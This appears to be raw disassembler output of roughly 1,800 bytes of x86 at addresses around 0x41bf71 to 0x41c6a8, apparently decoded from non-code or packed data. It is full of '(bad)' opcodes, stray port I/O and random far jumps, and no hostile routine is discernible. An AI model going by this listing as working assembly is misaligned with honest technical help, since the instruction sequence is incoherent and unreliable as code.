  41bf71:	and    BYTE PTR [edx+0x2d74b332],dh
  41bf77:	fldcw  WORD PTR [edi-0x13ee036b]
  41bf7d:	mov    cl,0x61
  41bf7f:	aam    0x82
  41bf81:	hlt    
  41bf82:	fstp   DWORD PTR [ebx]
  41bf84:	repnz add DWORD PTR [edx],ebx
  41bf87:	fs daa 
  41bf89:	std    
  41bf8a:	push   edi
  41bf8b:	push   cs
  41bf8c:	cmp    al,0xcc
  41bf8e:	dec    esp
  41bf8f:	and    DWORD PTR [edx-0x4b],esi
  41bf92:	into   
  41bf93:	(bad)  
  41bf94:	push   esp
  41bf95:	cmp    dh,BYTE PTR [eax-0x68]
  41bf98:	xchg   ecx,eax
  41bf99:	pusha  
  41bf9a:	mov    WORD PTR [eax],ss
  41bf9c:	in     eax,dx
  41bf9d:	test   eax,0x4f136023
  41bfa2:	push   esi
  41bfa3:	and    al,bh
  41bfa5:	or     ah,ch
  41bfa7:	pop    es
  41bfa8:	shr    BYTE PTR [edi+esi*2+0x25f15939],cl
  41bfaf:	(bad)  
  41bfb0:	mov    cl,BYTE PTR [ebp-0xc6dd10b]
  41bfb6:	or     eax,0xd582f6d0
  41bfbb:	cld    
  41bfbc:	fstp   DWORD PTR [edi+ecx*2+0x4e]
  41bfc0:	aaa    
  41bfc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfc2:	js     0x41bf80
  41bfc4:	mov    gs,WORD PTR [edi]
  41bfc6:	out    0x6b,al
  41bfc8:	mov    al,ds:0x85b48ba2
  41bfcd:	loope  0x41c00e
  41bfcf:	loopne 0x41bf8f
  41bfd1:	clc    
  41bfd2:	mov    ch,0x73
  41bfd4:	test   al,0xa0
  41bfd6:	ret    
  41bfd7:	shl    DWORD PTR ds:0x90e98212,cl
  41bfdd:	in     eax,0x73
  41bfdf:	fwait
  41bfe0:	xor    edi,DWORD PTR [eax+0x4d6adbc8]
  41bfe6:	sub    BYTE PTR [ecx+ecx*1+0x7acf0c95],dh
  41bfed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfee:	or     eax,0x3a0450cd
  41bff3:	mov    ebp,0x8010babb
  41bff8:	jbe    0x41c014
  41bffa:	push   ds
  41bffb:	call   0x3e4c6fa2
  41c000:	adc    al,BYTE PTR [eax]
  41c002:	xchg   ebp,ebx
  41c004:	scas   eax,DWORD PTR es:[edi]
  41c005:	sbb    DWORD PTR [edi-0x222dd257],esi
  41c00b:	inc    eax
  41c00c:	inc    eax
  41c00d:	mov    ch,0x83
  41c00f:	cld    
  41c010:	les    edi,FWORD PTR [ebp+0x5a]
  41c013:	adc    ebp,DWORD PTR [ebx]
  41c015:	jmp    FWORD PTR [esi+0x7e]
  41c018:	xchg   BYTE PTR [eax-0x49],dh
  41c01b:	push   ebx
  41c01c:	jmp    0x41bf9e
  41c01e:	ins    BYTE PTR es:[edi],dx
  41c01f:	xor    al,0x14
  41c021:	aaa    
  41c022:	inc    ecx
  41c023:	repz mov WORD PTR [ebp-0x48a27e36],cs
  41c02a:	int    0x53
  41c02c:	jp     0x41c0a3
  41c02e:	(bad)  
  41c02f:	popa   
  41c030:	xor    ebx,DWORD PTR [esi-0x12]
  41c033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c034:	jg     0x41c09d
  41c036:	cmp    esp,DWORD PTR [eax-0x26]
  41c039:	imul   ebp,DWORD PTR [eax+0x45143655],0x44
  41c040:	int3   
  41c041:	dec    edx
  41c042:	mov    ebx,0xbe4c499
  41c047:	adc    DWORD PTR [eax-0x64063c6b],ebp
  41c04d:	jno    0x41c087
  41c04f:	std    
  41c050:	(bad)  
  41c052:	out    0x63,eax
  41c054:	sub    DWORD PTR [ebx],ecx
  41c056:	shl    BYTE PTR [eax+0x15],cl
  41c059:	cmp    eax,0x706f9ffd
  41c05e:	add    edi,edx
  41c060:	push   0x52
  41c062:	pop    ds
  41c063:	mov    edi,0x1fdd9e8
  41c068:	xor    BYTE PTR [ecx+0x7e],bl
  41c06b:	xchg   esp,eax
  41c06c:	call   0x6b60:0x4ee3d2bf
  41c073:	pop    ss
  41c074:	jb     0x41c00e
  41c076:	push   cs
  41c077:	pop    es
  41c078:	fist   WORD PTR [eax-0x26dba7cb]
  41c07e:	fist   DWORD PTR [edx+0x6]
  41c081:	mov    BYTE PTR [esi+0x23c5d9fa],bl
  41c087:	ds enter 0x75f8,0xf
  41c08c:	int    0xc
  41c08e:	mov    al,ds:0xbf416a16
  41c093:	cmc    
  41c094:	xchg   ecx,eax
  41c095:	cmp    ebp,ebp
  41c097:	push   eax
  41c098:	lods   eax,DWORD PTR ds:[esi]
  41c099:	jns    0x41c081
  41c09b:	mov    ?,WORD PTR [esi]
  41c09d:	outs   dx,BYTE PTR ds:[esi]
  41c09e:	sbb    ah,dl
  41c0a0:	xchg   ebx,eax
  41c0a1:	jnp    0x41c0b5
  41c0a3:	out    0x7a,al
  41c0a5:	mov    ds:0x737ed62d,eax
  41c0aa:	cmc    
  41c0ab:	inc    ebx
  41c0ac:	loop   0x41c03e
  41c0ae:	aad    0xd5
  41c0b0:	into   
  41c0b1:	xchg   esp,eax
  41c0b2:	mov    bh,0xd
  41c0b4:	jge    0x41c105
  41c0b6:	dec    esi
  41c0b7:	mov    dl,0x2a
  41c0b9:	xchg   esp,eax
  41c0ba:	jmp    0xb133:0x9b07d717
  41c0c1:	stos   BYTE PTR es:[edi],al
  41c0c2:	int3   
  41c0c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c4:	rol    DWORD PTR [edx+0x2b],1
  41c0c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c8:	pusha  
  41c0c9:	dec    ebx
  41c0ca:	cmp    ah,BYTE PTR [eax-0x26]
  41c0cd:	scas   eax,DWORD PTR es:[edi]
  41c0ce:	push   ebp
  41c0cf:	fist   WORD PTR [eax-0x2c]
  41c0d2:	fimul  DWORD PTR [esi]
  41c0d4:	dec    eax
  41c0d5:	dec    esi
  41c0d6:	out    dx,eax
  41c0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0d8:	mov    WORD PTR [edx-0x1282c782],gs
  41c0de:	(bad)  
  41c0df:	jo     0x41c0ce
  41c0e1:	sti    
  41c0e2:	fbstp  TBYTE PTR [ecx-0x4cdfc8db]
  41c0e8:	(bad)  
  41c0ea:	ins    BYTE PTR es:[edi],dx
  41c0eb:	out    dx,eax
  41c0ec:	pop    ebp
  41c0ed:	jle    0x41c076
  41c0ef:	lea    esi,[ebx]
  41c0f1:	pop    ss
  41c0f2:	or     eax,0xb8925d81
  41c0f7:	inc    edi
  41c0f8:	push   es
  41c0f9:	sub    al,0x35
  41c0fb:	enter  0x66e6,0x4f
  41c0ff:	shl    BYTE PTR [ecx-0x2c],0x9e
  41c103:	pop    edi
  41c104:	xchg   ebx,eax
  41c105:	je     0x41c0ce
  41c107:	jle    0x41c15c
  41c109:	add    eax,0x5a42d9d1
  41c10e:	sbb    dl,dh
  41c110:	adc    dl,BYTE PTR [ecx+eiz*4+0x6e]
  41c114:	mov    bl,0xd3
  41c116:	ret    0x1419
  41c119:	mov    dh,0xb
  41c11b:	cwde   
  41c11c:	stos   BYTE PTR es:[edi],al
  41c11d:	ret    0xf557
  41c120:	ret    0x5ac3
  41c123:	repnz pop esi
  41c125:	xchg   esi,eax
  41c126:	sbb    ebp,DWORD PTR [edi+0xf6b9042]
  41c12c:	fidiv  WORD PTR [edx-0x48]
  41c12f:	(bad)  
  41c130:	std    
  41c131:	shl    ebp,1
  41c133:	scas   eax,DWORD PTR es:[edi]
  41c134:	(bad)  
  41c135:	jle    0x41c16a
  41c137:	ins    BYTE PTR es:[edi],dx
  41c138:	and    BYTE PTR [edx+0x6a],bh
  41c13b:	push   ecx
  41c13c:	push   edi
  41c13d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c13e:	aad    0xed
  41c140:	push   ss
  41c141:	mov    bl,0x5c
  41c143:	mov    ds:0x7717752f,al
  41c148:	sub    BYTE PTR ds:0xa7ee6708,bh
  41c14e:	loope  0x41c11d
  41c150:	mov    cl,0xd6
  41c152:	fld    DWORD PTR [ebp-0x7b64ad24]
  41c158:	cmp    eax,0x4a481062
  41c15d:	inc    edx
  41c15e:	and    cl,dl
  41c160:	dec    esi
  41c161:	pop    ecx
  41c162:	pop    ebp
  41c163:	frstor [eax]
  41c165:	mov    dl,0x48
  41c167:	mov    bh,0x86
  41c169:	ss cwde 
  41c16b:	iret   
  41c16c:	xchg   ebp,eax
  41c16d:	adc    bl,dl
  41c16f:	or     ecx,DWORD PTR [eax-0x51]
  41c172:	scas   eax,DWORD PTR es:[edi]
  41c173:	lahf   
  41c174:	adc    DWORD PTR [ebp+0x1f],0x3247446e
  41c17b:	int3   
  41c17c:	mov    ecx,cs
  41c17e:	or     DWORD PTR [ecx-0x470d69cd],edi
  41c184:	mov    edi,0x8fb9a27d
  41c189:	mov    fs,ecx
  41c18b:	ds stos DWORD PTR es:[di],eax
  41c18e:	fwait
  41c18f:	adc    ch,BYTE PTR [ebp+0x55c2b3ad]
  41c195:	or     eax,0x35752e69
  41c19a:	out    0x54,eax
  41c19c:	test   al,0x56
  41c19e:	jbe    0x41c16f
  41c1a0:	inc    esi
  41c1a1:	sbb    al,0x7c
  41c1a3:	outs   dx,DWORD PTR ds:[esi]
  41c1a4:	lods   al,BYTE PTR ds:[esi]
  41c1a6:	mov    dl,0xc8
  41c1a8:	push   ecx
  41c1a9:	or     DWORD PTR [edx+ebx*2+0x41b6bee5],ebx
  41c1b0:	dec    ebp
  41c1b1:	stos   BYTE PTR es:[edi],al
  41c1b2:	int3   
  41c1b3:	pop    ebp
  41c1b4:	das    
  41c1b5:	or     ch,BYTE PTR [eax+0x3f]
  41c1b8:	jl     0x41c181
  41c1ba:	xlat   BYTE PTR ds:[ebx]
  41c1bb:	gs jne 0x41c200
  41c1be:	lods   al,BYTE PTR ds:[esi]
  41c1bf:	inc    esi
  41c1c0:	mov    edi,0x26a19d1a
  41c1c5:	dec    bp
  41c1c7:	dec    edi
  41c1c8:	push   ecx
  41c1c9:	push   edx
  41c1ca:	mov    dh,0xa7
  41c1cc:	aas    
  41c1cd:	mov    eax,0xef38744f
  41c1d2:	inc    esp
  41c1d3:	or     eax,0x75197b8f
  41c1d8:	ins    DWORD PTR es:[edi],dx
  41c1d9:	mov    ecx,0x3897fb40
  41c1de:	stos   DWORD PTR es:[edi],eax
  41c1df:	std    
  41c1e0:	jmp    0x41c23c
  41c1e2:	mov    ebx,0xfc1bf16a
  41c1e7:	sbb    eax,ebp
  41c1e9:	arpl   cx,ax
  41c1eb:	jp     0x41c197
  41c1ed:	mov    ah,0x1b
  41c1ef:	(bad)  
  41c1f0:	dec    ebp
  41c1f1:	test   DWORD PTR [eax],ebp
  41c1f3:	aam    0x30
  41c1f5:	pop    es
  41c1f6:	sub    eax,0x923746fe
  41c1fb:	addr16 push ecx
  41c1fd:	test   eax,0x3c225c4e
  41c202:	mov    ah,0x5a
  41c204:	fdiv   QWORD PTR cs:[ebp-0x96032cc]
  41c20b:	sbb    ecx,DWORD PTR ss:[eax+0x67]
  41c20f:	inc    ebx
  41c210:	stos   BYTE PTR es:[edi],al
  41c211:	inc    esp
  41c212:	adc    al,0x9b
  41c214:	inc    esp
  41c215:	je     0x41c288
  41c217:	or     ebp,DWORD PTR [edi+eiz*4-0x65]
  41c21b:	sub    eax,0x97b32636
  41c220:	gs cmp al,0x97
  41c223:	sbb    eax,0xbe22a265
  41c228:	ss into 
  41c22a:	clc    
  41c22b:	sub    al,0x77
  41c22d:	in     eax,0x7d
  41c22f:	mov    al,0x3c
  41c231:	xchg   ebp,eax
  41c232:	ins    DWORD PTR es:[edi],dx
  41c233:	or     ecx,esi
  41c235:	retf   
  41c236:	jb     0x41c1d9
  41c238:	imul   edx,DWORD PTR [esi+eax*8+0x4],0xffffffef
  41c23d:	mov    eax,ds:0x499af04a
  41c242:	ficomp WORD PTR [ebx+ebx*2]
  41c245:	mov    ebp,0xcd06c80c
  41c24a:	outs   dx,DWORD PTR ds:[esi]
  41c24b:	push   eax
  41c24c:	ds push ebx
  41c24e:	xchg   ecx,eax
  41c24f:	das    
  41c250:	or     al,0x72
  41c252:	push   ebp
  41c253:	pop    ds
  41c254:	mov    ebp,0x78fc230d
  41c259:	push   eax
  41c25a:	lahf   
  41c25b:	sar    BYTE PTR [ecx+ecx*1+0x3d],cl
  41c25f:	mov    ds:0xee92375,eax
  41c264:	sub    eax,0x2c64db6
  41c269:	test   eax,0xc9f6db95
  41c26e:	add    bh,BYTE PTR [ecx]
  41c270:	xor    al,0xf9
  41c272:	shl    BYTE PTR [ebx-0x61732137],0x27
  41c279:	jmp    0xa61e:0xf45daa4a
  41c280:	sbb    ch,BYTE PTR [ebx]
  41c282:	mov    ecx,ebp
  41c284:	cs adc edx,ebp
  41c287:	xchg   esi,eax
  41c288:	jnp    0x41c2dd
  41c28a:	and    DWORD PTR [esi+esi*1],0xffffff90
  41c28e:	add    eax,0x258de94e
  41c293:	and    ah,BYTE PTR [ebx]
  41c295:	xchg   esp,eax
  41c296:	shl    BYTE PTR [eax+0x712aecd1],1
  41c29c:	bound  ecx,QWORD PTR [edi-0x68ca30b8]
  41c2a2:	sbb    BYTE PTR [ecx-0x4996e898],bl
  41c2a8:	test   BYTE PTR [eax],al
  41c2aa:	loopne 0x41c2d6
  41c2ac:	(bad)  
  41c2ad:	mov    ds:0x140c49f5,eax
  41c2b2:	jg     0x41c2b3
  41c2b4:	(bad)  
  41c2b5:	mov    eax,ds:0x91112c48
  41c2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2bb:	ja     0x41c2ed
  41c2bd:	mov    bl,0xcf
  41c2bf:	fistp  WORD PTR [eax]
  41c2c1:	call   0x547261e1
  41c2c6:	sbb    al,0x54
  41c2c8:	or     dh,bh
  41c2ca:	call   FWORD PTR [edx+0x0]
  41c2cd:	xchg   ecx,eax
  41c2ce:	lods   eax,DWORD PTR ds:[esi]
  41c2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2d0:	iret   
  41c2d1:	(bad)
  41c2d4:	shr    BYTE PTR [esi],1
  41c2d6:	pop    esi
  41c2d7:	pop    es
  41c2d8:	xchg   DWORD PTR [ebp-0x47],edi
  41c2db:	std    
  41c2dc:	add    al,dl
  41c2de:	dec    edi
  41c2df:	in     eax,dx
  41c2e0:	and    dh,BYTE PTR [eax-0x1f]
  41c2e3:	fnstsw WORD PTR [edx+edx*1]
  41c2e6:	aaa    
  41c2e7:	nop
  41c2e8:	mov    ebp,0x27b7a34c
  41c2ed:	xor    DWORD PTR [edi+0x25876155],ebx
  41c2f3:	mov    ebp,DWORD PTR [esi+0x6cacb8e5]
  41c2f9:	pop    ss
  41c2fa:	cmp    ebp,edi
  41c2fc:	adc    al,0xc3
  41c2fe:	sub    al,BYTE PTR [ebp-0x6ecf59a8]
  41c304:	iret   
  41c305:	adc    al,0x2a
  41c307:	sbb    ecx,DWORD PTR [eax]
  41c309:	and    cl,ah
  41c30b:	fbstp  TBYTE PTR [edi-0x4f75c00a]
  41c311:	(bad)  
  41c312:	sub    BYTE PTR [esi],ah
  41c314:	mov    ebp,0xffae5923
  41c319:	pop    eax
  41c31a:	sub    eax,0xeee79697
  41c31f:	mov    ecx,0xc2419981
  41c324:	mov    bl,BYTE PTR [esp+eiz*8-0x11]
  41c328:	push   ebp
  41c329:	mov    ds:0x9803767c,eax
  41c32e:	mov    al,0xb1
  41c330:	or     bl,ch
  41c332:	out    dx,eax
  41c333:	clc    
  41c334:	or     eax,0x919807ad
  41c339:	(bad)  
  41c33a:	sub    al,0x83
  41c33c:	ret    
  41c33d:	test   BYTE PTR [ebp+ebx*4-0x62a242e6],dl
  41c344:	in     eax,dx
  41c345:	jp     0x41c341
  41c347:	clc    
  41c348:	lock and ch,dh
  41c34b:	xchg   DWORD PTR [ebx-0x39],esi
  41c34e:	popf   
  41c34f:	xchg   ebx,eax
  41c350:	jbe    0x41c322
  41c352:	xor    al,0x11
  41c354:	in     al,0x7b
  41c356:	ins    BYTE PTR es:[edi],dx
  41c357:	mov    ds:0xf81c78f2,al
  41c35c:	repnz std 
  41c35e:	xor    eax,0xfab2fb44
  41c363:	sub    cl,ch
  41c365:	stos   BYTE PTR es:[edi],al
  41c366:	jl     0x41c3d3
  41c368:	hlt    
  41c369:	lea    edi,[edi+0x70]
  41c36c:	push   ebx
  41c36d:	addr16 call 0x72c7:0x7fd6e7da
  41c375:	loop   0x41c3d5
  41c377:	das    
  41c378:	int    0x76
  41c37a:	sub    eax,0x94eebdf
  41c37f:	scas   al,BYTE PTR es:[edi]
  41c380:	or     DWORD PTR [eax-0x10d7f4c3],0xffffffa0
  41c387:	in     eax,0xea
  41c389:	xchg   edx,eax
  41c38a:	pop    ds
  41c38b:	(bad)  
  41c38c:	int3   
  41c38d:	mov    BYTE PTR [edi],bl
  41c38f:	jle    0x41c3fa
  41c391:	imul   ebp,DWORD PTR [edi+0x30],0x197fb0cd
  41c398:	and    ebp,DWORD PTR ds:0xad488068
  41c39e:	call   0x85de:0x73017c7a
  41c3a5:	inc    ecx
  41c3a6:	pop    eax
  41c3a7:	lds    edx,FWORD PTR [ecx+0x24]
  41c3aa:	aad    0x4e
  41c3ac:	shl    DWORD PTR ds:0x39a2a4ae,1
  41c3b2:	fwait
  41c3b3:	and    DWORD PTR [eax],ecx
  41c3b5:	push   edi
  41c3b6:	and    ebp,DWORD PTR [eax+0x4f160940]
  41c3bc:	cmp    eax,0xa5fbf6fb
  41c3c1:	sbb    dl,BYTE PTR [ebp+0x3b459724]
  41c3c7:	iret   
  41c3c8:	mov    esp,0x28c3976a
  41c3cd:	sbb    esi,DWORD PTR [edx-0x5b]
  41c3d0:	xlat   BYTE PTR ds:[ebx]
  41c3d1:	jp     0x41c372
  41c3d3:	mov    ebp,0x994ccb31
  41c3d8:	retf   
  41c3d9:	leave  
  41c3da:	pushf  
  41c3db:	or     eax,0x2b5ef924
  41c3e0:	cmp    BYTE PTR [eax+0x24e25aa6],bl
  41c3e6:	xor    eax,0x215034a6
  41c3eb:	add    eax,0xcbfe9aff
  41c3f0:	pop    esi
  41c3f1:	(bad)  
  41c3f2:	or     ch,BYTE PTR [edi-0x3039f236]
  41c3f8:	inc    eax
  41c3f9:	ret    
  41c3fa:	xchg   esp,eax
  41c3fb:	add    dh,al
  41c3fd:	mov    ?,WORD PTR [eax]
  41c3ff:	scas   eax,DWORD PTR es:[edi]
  41c400:	cmp    BYTE PTR [edi+0x77],dh
  41c403:	jbe    0x41c3be
  41c405:	fisttp DWORD PTR [eax+0x5b]
  41c408:	fcomp  QWORD PTR [esi-0x65fd8b33]
  41c40f:	and    esi,DWORD PTR [ebp-0xf9a5018]
  41c415:	ds (bad) 
  41c417:	call   0x53d951c2
  41c41c:	inc    edx
  41c41d:	mov    esp,DWORD PTR [ecx]
  41c41f:	loop   0x41c413
  41c421:	ins    DWORD PTR es:[edi],dx
  41c422:	imul   ebx,DWORD PTR [esi+0x4faacf87],0xc42b3694
  41c42c:	test   DWORD PTR [edx+0x2ca8088d],eax
  41c432:	pop    ds
  41c433:	cmp    eax,0xb457d0f3
  41c438:	fwait
  41c439:	add    al,0xaf
  41c43b:	outs   dx,BYTE PTR ds:[esi]
  41c43c:	push   ds
  41c43d:	outs   dx,DWORD PTR ds:[esi]
  41c43e:	dec    ebp
  41c43f:	mov    ebx,0x62c76039
  41c444:	mov    ds:0xf0871f7e,eax
  41c449:	in     eax,dx
  41c44a:	gs lahf 
  41c44c:	push   es
  41c44d:	fstp   TBYTE PTR [eax-0x10]
  41c450:	in     al,0x60
  41c452:	scas   al,BYTE PTR es:[edi]
  41c453:	popf   
  41c454:	jae    0x41c42f
  41c456:	jno    0x41c456
  41c458:	retf   
  41c459:	push   eax
  41c45a:	jmp    0xa05c:0x812cd3b6
  41c461:	mov    ecx,0x521f44f
  41c466:	add    DWORD PTR [ecx+eiz*1],edi
  41c469:	int    0x2a
  41c46b:	jnp    0x41c472
  41c46d:	stos   DWORD PTR es:[edi],eax
  41c46e:	inc    cl
  41c470:	and    BYTE PTR [eax-0x1d],0xc6
  41c474:	(bad)  
  41c475:	dec    ebx
  41c476:	cmc    
  41c477:	out    0xeb,eax
  41c479:	pop    es
  41c47a:	push   ds
  41c47b:	xchg   BYTE PTR ds:0x874ec9d3,cl
  41c481:	fs loop 0x41c4b8
  41c484:	cli    
  41c485:	ins    DWORD PTR es:[edi],dx
  41c486:	cmp    edi,ecx
  41c488:	sbb    BYTE PTR [ebx],bh
  41c48a:	out    0x92,eax
  41c48c:	adc    al,0xfd
  41c48e:	xor    BYTE PTR [edi],cl
  41c490:	fild   WORD PTR [edi-0x32d22bf2]
  41c496:	sbb    cl,BYTE PTR [ebp+edi*8-0x48af06aa]
  41c49d:	adc    esi,0xa775df02
  41c4a3:	add    dl,BYTE PTR [ecx]
  41c4a5:	and    eax,0xeb4de14f
  41c4aa:	pop    eax
  41c4ab:	cs push eax
  41c4ad:	les    edi,FWORD PTR [ebp+0x547d5cb1]
  41c4b3:	mov    BYTE PTR [esi],bl
  41c4b5:	rol    edx,1
  41c4b7:	stc    
  41c4b8:	xchg   esi,eax
  41c4b9:	inc    ebx
  41c4ba:	inc    edx
  41c4bb:	repnz dec ecx
  41c4bd:	pop    ebx
  41c4be:	sub    al,0xe
  41c4c0:	test   DWORD PTR [ecx],ebx
  41c4c2:	lods   al,BYTE PTR ds:[esi]
  41c4c3:	jmp    0x41c473
  41c4c5:	mov    esi,0xfb746ca4
  41c4ca:	test   BYTE PTR [ebp+0x202ef7c8],bh
  41c4d0:	jns    0x41c495
  41c4d2:	add    esi,DWORD PTR [edi]
  41c4d4:	push   ds
  41c4d5:	fwait
  41c4d6:	and    DWORD PTR [edi],edi
  41c4d8:	in     al,dx
  41c4d9:	push   ecx
  41c4da:	xor    BYTE PTR [edx+ecx*8+0x23487b02],dl
  41c4e1:	sbb    al,0x5b
  41c4e3:	add    al,0xcc
  41c4e5:	sub    edx,DWORD PTR [ecx-0x22]
  41c4e8:	(bad)  
  41c4e9:	jo     0x41c500
  41c4eb:	hlt    
  41c4ec:	sar    BYTE PTR [edx],cl
  41c4ee:	cmp    ecx,eax
  41c4f0:	sti    
  41c4f1:	adc    DWORD PTR [esi],ecx
  41c4f3:	adc    ebp,DWORD PTR [edx+edx*8-0x4e]
  41c4f7:	adc    eax,DWORD PTR ds:0xaa2cfd6
  41c4fd:	dec    esi
  41c4fe:	or     al,0x7d
  41c500:	push   esp
  41c501:	jae    0x41c4d1
  41c503:	xor    edx,DWORD PTR [edi]
  41c505:	loopne 0x41c4fe
  41c507:	scas   al,BYTE PTR es:[edi]
  41c508:	sub    dl,BYTE PTR [esi+esi*8]
  41c50b:	out    dx,al
  41c50c:	jp     0x41c57d
  41c50e:	mov    edx,0xca7ec15f
  41c513:	scas   eax,DWORD PTR es:[edi]
  41c514:	cs cmp ebx,ecx
  41c517:	es xchg esp,eax
  41c519:	in     eax,dx
  41c51a:	mov    ah,0xb6
  41c51c:	pop    eax
  41c51d:	sbb    eax,0xdc7ba064
  41c522:	addr16 je 0x41c4f5
  41c525:	inc    ebp
  41c526:	or     BYTE PTR [ecx-0x57],bh
  41c529:	push   0xffffffbb
  41c52b:	ins    BYTE PTR es:[edi],dx
  41c52c:	lods   al,BYTE PTR ds:[esi]
  41c52d:	shl    edx,0x69
  41c530:	mov    edx,0x5946ae44
  41c535:	sar    BYTE PTR gs:[ebx],0xc6
  41c539:	mov    BYTE PTR [eax-0x5942f88c],dh
  41c53f:	dec    ecx
  41c540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c541:	loope  0x41c593
  41c543:	out    0x60,eax
  41c545:	push   ecx
  41c546:	pop    es
  41c547:	sar    DWORD PTR [esi+esi*2+0x57250140],cl
  41c54e:	add    eax,0x98f6fb03
  41c553:	hlt    
  41c554:	and    ecx,ecx
  41c556:	ins    DWORD PTR es:[edi],dx
  41c557:	(bad)  
  41c558:	(bad)  
  41c559:	jl     0x41c597
  41c55b:	and    eax,0x9e2e56de
  41c560:	mov    eax,0x62bc219e
  41c565:	jmp    0x41c592
  41c567:	add    eax,0x91befeb4
  41c56c:	and    eax,0x70cbe6f9
  41c571:	aaa    
  41c572:	out    0x67,eax
  41c574:	sub    BYTE PTR [esi+0x377726bf],dh
  41c57a:	or     eax,0x7301e564
  41c57f:	sbb    ebx,DWORD PTR [ecx+eax*2-0x78e31d8d]
  41c586:	and    DWORD PTR [ebx+0x49562850],edi
  41c58c:	cli    
  41c58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c58e:	pop    ecx
  41c58f:	inc    edx
  41c590:	repz mov al,0xae
  41c593:	pop    edi
  41c594:	mov    ss,WORD PTR [esi]
  41c596:	stos   DWORD PTR es:[edi],eax
  41c597:	repnz sub al,0x72
  41c59a:	in     eax,0x85
  41c59c:	add    esi,ebx
  41c59e:	ins    BYTE PTR es:[edi],dx
  41c59f:	adc    DWORD PTR [edi-0x45],ecx
  41c5a2:	popf   
  41c5a3:	ins    BYTE PTR es:[edi],dx
  41c5a4:	int3   
  41c5a5:	mov    ds:0xa99d3e37,eax
  41c5aa:	dec    esp
  41c5ab:	push   ds
  41c5ac:	test   al,0x22
  41c5ae:	pop    eax
  41c5af:	pop    dx
  41c5b1:	push   esp
  41c5b2:	and    bh,bl
  41c5b4:	retf   
  41c5b5:	es dec edx
  41c5b7:	cld    
  41c5b8:	inc    ecx
  41c5b9:	xchg   DWORD PTR [ecx],ecx
  41c5bb:	cmp    al,0xc3
  41c5bd:	cld    
  41c5be:	push   esi
  41c5bf:	jbe    0x41c637
  41c5c1:	adc    bl,BYTE PTR [esi]
  41c5c3:	sub    dl,BYTE PTR ds:0x6bb1d828
  41c5c9:	lods   al,BYTE PTR ds:[esi]
  41c5ca:	retf   0xe515
  41c5cd:	push   ds
  41c5ce:	out    dx,eax
  41c5cf:	es jge 0x41c5b8
  41c5d2:	inc    edi
  41c5d3:	sbb    al,0x73
  41c5d5:	retf   
  41c5d6:	sub    al,0x4d
  41c5d8:	(bad)  
  41c5d9:	and    bl,BYTE PTR [edx]
  41c5db:	lds    esp,FWORD PTR ds:0x70fb34e8
  41c5e1:	(bad)  
  41c5e2:	and    dh,ah
  41c5e4:	mov    ds:0x19505495,al
  41c5e9:	shr    BYTE PTR [esi+eax*2-0x679a53a3],1
  41c5f0:	add    BYTE PTR [esi+0x17],ch
  41c5f3:	(bad)  
  41c5f4:	int    0xb7
  41c5f6:	mov    cl,0x2
  41c5f8:	test   al,0xa5
  41c5fa:	ficomp WORD PTR [esi+0x0]
  41c5fd:	test   DWORD PTR [ebx+0x1c6f23de],ebp
  41c603:	lods   al,BYTE PTR ds:[esi]
  41c604:	add    ebx,DWORD PTR [eax-0x2f]
  41c607:	dec    esi
  41c608:	lds    ebp,FWORD PTR [esi+0x37547128]
  41c60e:	cwde   
  41c60f:	xor    edx,DWORD PTR [ecx]
  41c611:	push   ebp
  41c612:	cmp    al,0x77
  41c614:	sub    BYTE PTR [esi+0x2d],cl
  41c617:	mov    ?,esi
  41c619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c61a:	jge    0x41c603
  41c61c:	fs jge 0x41c5f9
  41c61f:	outs   dx,BYTE PTR ds:[esi]
  41c620:	inc    edi
  41c621:	fidiv  DWORD PTR [esi-0x30828539]
  41c627:	xchg   ebx,eax
  41c628:	adc    ebx,DWORD PTR [ecx]
  41c62a:	ret    0xaeb
  41c62d:	ja     0x41c616
  41c62f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c630:	push   ebx
  41c631:	pusha  
  41c632:	imul   edi
  41c634:	dec    ebp
  41c635:	ret    0x937
  41c638:	fst    DWORD PTR [ebp-0x1f579863]
  41c63e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c63f:	push   esp
  41c640:	rcl    BYTE PTR [esi],cl
  41c642:	shl    BYTE PTR [ebx+esi*4],0x7c
  41c646:	sbb    ebp,DWORD PTR [ecx+edi*2-0x7887272f]
  41c64d:	pop    esp
  41c64e:	fsub   QWORD PTR [ebp-0x2f]
  41c651:	pop    edi
  41c652:	pop    ebx
  41c653:	mov    esp,0xef7e818c
  41c658:	int    0x9a
  41c65a:	ret    
  41c65b:	push   edx
  41c65c:	push   eax
  41c65d:	test   BYTE PTR [eax-0x206abf61],ch
  41c663:	jnp    0x41c657
  41c665:	mov    dl,0x36
  41c667:	shl    BYTE PTR [esi+0x6],0xf9
  41c66b:	jb     0x41c600
  41c66d:	push   cs
  41c66e:	xor    BYTE PTR [eax-0x4c52035b],ch
  41c674:	test   eax,0x319263f4
  41c679:	xchg   ecx,eax
  41c67a:	fstp   st(6)
  41c67c:	imul   ebp,esi,0xf4e24dce
  41c682:	pop    edx
  41c683:	push   ss
  41c684:	nop
  41c685:	inc    edx
  41c686:	in     al,dx
  41c687:	jp     0x41c636
  41c689:	sub    BYTE PTR [edx],bh
  41c68b:	sub    esp,ebx
  41c68d:	rcl    BYTE PTR [ebp-0x20261d65],0x85
  41c694:	popf   
  41c695:	xor    al,0x5a
  41c697:	adc    BYTE PTR [edi+0x22fddb6f],dh
  41c69d:	pop    ecx
  41c69e:	or     edi,DWORD PTR [esi-0x5c]
  41c6a1:	sub    ebp,edx
  41c6a3:	xchg   ebx,eax
  41c6a4:	fcomi  st,st(5)
  41c6a6:	retf   
  41c6a7:	outs   dx,BYTE PTR ds:[esi]
  41c6a8:	fcomp  QWORD PTR [ecx+0xd227584]
